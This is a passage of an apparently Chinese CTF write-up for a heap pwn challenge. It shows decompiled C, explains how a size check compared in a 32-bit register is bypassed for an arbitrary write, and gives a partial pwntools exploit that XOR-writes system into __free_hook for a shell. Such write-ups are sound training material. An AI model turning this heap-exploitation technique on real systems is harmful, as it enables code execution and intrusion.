class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3)encrypt(edit)</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 remain_size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST20_8</span>  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-38h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-30h]</span>  <span class="token keyword">unsigned</span> __int64 offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> __int64 edit_size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Box ID: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>LABEL_9<span class="token punctuation">:</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Finish!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Offset of msg: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    offset <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">></span> offset <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Len of msg: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      remain_size <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">-</span> offset<span class="token punctuation">;</span>      edit_size <span class="token operator">=</span> <span class="token function">get_number</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> edit_size <span class="token operator">&lt;=</span> remain_size <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Msg: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read_info</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span> edit_size<span class="token punctuation">)</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> offset<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> edit_size<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v6 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>qword_202060<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//  从create chunk的chunk中读取的随机数来进行异或</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Empty Box!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样看起来貌似没有什么问题，但是从汇编层面来看：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/1.png"></div><p>create比较最大size的时候是用eax寄存器来比较，这样就可以想办法绕过了。即使用-0x100000000就可以绕过最大size的限制。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/2.png"></div>编辑的时候也是根据chunk的地址+offset来写入。当我们的size很大的时候，offset不会大于size，chunk_addr由于超大size分配失败，所以这个地方等于0.这样的话，我们就可以在encrypt中实现任意地址写的目的。<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.第一步利用释放再分配的方式打印出libc 和heap地址，其实heap地址都没必要了<br>2.第二步利用绕过size的方式，写入一个超大size<br>3.第三步异或写free_hook为one_gadget</p><p>之前打比赛的时候卡在最后异或，忘记随机数一开始就输出了。。。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span>  <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#p = process("./chall")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"192.168.241.131"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_ld</span><span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Force to use assigned new ld.so by changing the binary    """</span>    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>ld<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>        log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to ld"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> None    <span class="token keyword">if</span> <span class="token operator">not</span> isinstance<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ELF<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to binary"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> None        binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>    <span class="token keyword">for</span> segment <span class="token keyword">in</span> binary<span class="token punctuation">.</span>segments<span class="token punctuation">:</span>        <span class="token keyword">if</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'PT_INTERP'</span><span class="token punctuation">:</span>            size <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_memsz'</span><span class="token punctuation">]</span>            addr <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_paddr'</span><span class="token punctuation">]</span>            data <span class="token operator">=</span> segment<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> size <span class="token operator">&lt;=</span> len<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">:</span>                log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Failed to change PT_INTERP from {} to {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> None            binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> ld<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">)</span>            path <span class="token operator">=</span> <span class="token string">'/tmp/pwn/{}_debug'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>binary<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>path<span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                info<span class="token punctuation">(</span><span class="token string">"Removing exist file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            binary<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0b111000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rwx------</span>    success<span class="token punctuation">(</span><span class="token string">"PT_INTERP has changed from {} to {}. Using temp file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ELF<span class="token punctuation">(</span>path<span class="token punctuation">)</span>elf <span class="token operator">=</span> change_ld<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">,</span> <span class="token string">'./ld-linux-x86-64.so.2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe6b93</span><span class="token punctuation">,</span><span class="token number">0xe6b96</span><span class="token punctuation">,</span><span class="token number">0xe6b99</span><span class="token punctuation">,</span><span class="token number">0x10afa9</span><span class="token punctuation">,</span><span class="token number">0x10afb5</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ID: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>len<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ID: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Offset of msg: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Len of msg: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Msg:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>offset<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ID: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Offset of msg: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Len of msg: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x430</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7fc3fd0</span><span class="token operator">+</span><span class="token number">0x7ffff7dd9000</span>success<span class="token punctuation">(</span><span class="token string">"libc base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x690</span>create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Key: \n"</span><span class="token punctuation">)</span>key1 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"key1 is ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span>ord<span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">)</span><span class="token operator">^</span>key1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># enc(3,7,1,str(((gadget>>56)&amp;0xff)^key))</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">4294967296</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Key: \n"</span><span class="token punctuation">)</span>key <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"key2 is ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>gadget <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"system address ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">24</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">48</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>enc<span class="token 